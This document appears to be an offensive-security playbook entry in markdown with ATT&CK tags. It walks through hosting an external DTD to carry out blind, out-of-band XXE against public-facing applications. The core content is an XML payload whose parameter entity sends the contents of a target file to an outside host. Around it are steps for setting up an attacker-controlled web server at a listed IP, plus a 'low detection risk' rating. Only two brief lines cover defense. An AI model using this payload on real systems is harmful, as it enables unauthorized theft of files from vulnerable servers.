---
tags:
  - xxe
  - oob
  - dtd-hosting
type: procedure
tools:
  - '[[tools/Web-Server]]'
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/xxe-dtd-payload]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: 0e9235ce-7548-457c-b9e2-92b5ea8b61d7
created_at: '2025-12-13T09:00:28.039Z'
updated_at: '2025-12-13T09:00:28.039Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Host External DTD for XXE

## Summary

This procedure sets up a web server to host an external DTD file, facilitating out-of-band XXE exploitation by allowing the target server to fetch and process the DTD.

## Description

Hosting a custom DTD enables parameter entities to exfiltrate data or confirm vulnerabilities blindly. The DTD defines entities that trigger outbound requests to the attacker's server.

## Requirements

1. Control over a web server (e.g., at 122.180.248.81)
2. Ability to host files accessible via HTTP
3. DTD content prepared

## Defense

Defensive measures and detection strategies:

- Disable external entity resolution in XML parsers
- Monitor outbound traffic for anomalous requests

## Objectives

1. Deploy web server
2. Host payload.dtd
3. Ensure accessibility

## Instructions

### Step 1: Deploy Web Server

**Context**: Set up the server to host files.

Deploy a [[tools/Web-Server]] and configure it to serve files.

> Expected: Server running and accessible.

### Step 2: Host DTD File

**Context**: Upload and host the DTD content.

Host the file payload.dtd with content from [[commands/xxe-dtd-payload]]:

```xml
<?xml version="1.0" encoding="UTF-8"?> <!ENTITY % all "<!ENTITY send SYSTEM 'http://xxe.me/content?%file;'>"> %all;
```

> Expected: File available at http://122.180.248.81/payload.dtd.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/xxe-dtd-payload]]

## Tools Used

- [[tools/Web-Server]]

## Tags

- xxe
- oob
- dtd-hosting
